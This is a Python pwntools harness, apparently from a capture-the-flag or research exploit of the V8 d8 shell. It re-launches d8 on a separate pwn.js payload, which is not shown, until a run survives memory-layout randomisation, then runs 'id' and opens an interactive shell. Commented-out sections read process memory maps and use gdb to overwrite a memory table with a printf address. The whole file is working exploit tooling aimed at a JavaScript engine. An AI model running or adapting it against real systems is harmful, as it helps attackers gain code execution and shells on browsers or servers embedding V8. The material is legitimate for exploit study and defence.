from pwn import *

tried = 0
while True:
    try:
        p = process(["./d8", "--allow-natives-syntax", "--shell", "pwn.js"])

        log.info(f"number of tries = {tried}")
        tried += 1

        #log.info(f"Launched process with PID: {p.pid}")

        #log.info(p.recvuntil(b'pop_rdi')[-37:][:-12])

        #long_awaited = "ff"

        #thi_line = open(f"/proc/{p.pid}/maps", "r").readlines()
        #if len(thi_line) <= 38:
        #    #log.info(thi_line)
        #    pass
        #else:
        #    thi_line = thi_line[38]
        #log.info(thi_line)
        #if thi_line[4:6] == long_awaited:
        #    log.info("Hold up this should work!!!!!!")
        #print(open(f"/proc/{p.pid}/maps", "r").read())

        i = 0
        while i < 100_000:
            if p.poll() is not None:
                break
            i += 1

        if p.poll() is None:
            #log.success("Found a process that didn't segfault!")
            #log.info(f"PID of non-segfaulting process: {p.pid}")
            #output = p.recvall(timeout=1)
            #if b'ReferenceError' in output:
            #    print(output)
            #    log.warning("Process lazyfaulted, retrying...")
            #    if thi_line[4:6] == long_awaited:
            #        log.info("Hold up this should work!!!!!!")
            #        #exit()
            #    p.close()
            #    continue
            #if thi_line[4:6] == long_awaited:
            #    log.info("Hold up this should work!!!!!!")
            #print(output)
            p.sendline(b'id')
            output = p.recvall(timeout=1)
            print(output.decode())
            p.interactive()
            break
        else:
            #log.warning("Process segfaulted, retrying...")
            #if thi_line[4:6] == long_awaited:
            #    log.info("Hold up this should work!!!!!!")
            #    #exit()
            p.close()

    except Exception as e:
        log.error(f"Error occurred: {e}")



#i = 0
#
#printf = 0x7ffff7ce61c0
#
#for addr in range(0x5555569e80a0, 0x5555569e86d0+0x10, 8):
#	if i == 0x01: #current placeholder
#		gdb.execute(f"set {{long long}} {hex(addr)} = {hex(printf)}")
#	elif i == 0x50 or i == 0x4f:
#		pass
#	elif i == 0x4e:
#		gdb.execute(f"set {{long long}} {hex(addr)} = {hex(0x5555569e80a0+0x8 - 0x10510)}")
#	else:
#		gdb.execute(f"set {{long long}} {hex(addr)} = {hex(0x4141414100000000 + i)}")
#	i += 1
